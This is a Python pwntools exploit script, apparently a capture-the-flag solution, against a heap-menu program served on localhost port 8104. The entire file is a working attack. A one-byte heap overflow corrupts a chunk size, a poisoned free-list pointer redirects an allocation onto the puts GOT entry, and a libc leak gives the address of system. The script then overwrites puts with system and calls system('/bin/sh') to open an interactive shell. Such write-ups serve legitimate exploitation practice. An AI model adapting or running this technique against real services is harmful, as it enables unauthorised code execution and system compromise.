from pwn import *

p = remote("localhost", 8104)

def menu():
    p.recvuntil('5) Exit\n')

menu()

def allocate(size, read_menu=True):
    p.sendline('1')
    p.clean()
    p.sendline(str(size))
    if read_menu:
        menu()
    else:
        p.clean()

def delete(read_menu=True):
    p.sendline('2')
    retval = int(p.readline().split()[2])
    if read_menu:
        menu()
    return retval

def write(content, read_menu=True):
    p.sendline('3')
    p.clean()
    p.sendline(content)
    if read_menu:
        menu()
    else:
        p.clean()

def print_block(read_menu=True):
    p.sendline('4')
    retval = p.recvuntil('\n1) ')
    if read_menu:
        menu()
    return retval

PUTS_GOT_ADDR = 0x607020
SYSTEM_OFFSET = -172800

# Setup one byte overwrite
allocate(64)
write('A'*64 + '\x80')

# Create block in space with overwriten size, then delete it
allocate(64)
delete()

# Program in now confused of where 128 byte table should be
# let's allocate one and overwrite next chunk pointer of following 64 byte chunk
allocate(128)
write('B'*64 + p64(0x40) + p64(PUTS_GOT_ADDR - 0x10)) # -0x10 because the "next" pointer points at the chunk header, not the content

# Move current chunk ahead so that we're using the location we specified (the GOT)
allocate(64)
allocate(64)

# Read address of puts by printing block
puts_addr = u64(print_block()[:6]+'\x00\x00')

# Calculate system location
system_addr = puts_addr + SYSTEM_OFFSET

# Write to block system's address, puts() now is system()
write(p64(system_addr), False)

# Create a new block on a clean table, then write our command to it
allocate(512, False)
write('/bin/sh', False)

# Print block, which calls system('/bin/sh')
p.sendline('4')

# Enjoy shell
p.interactive()
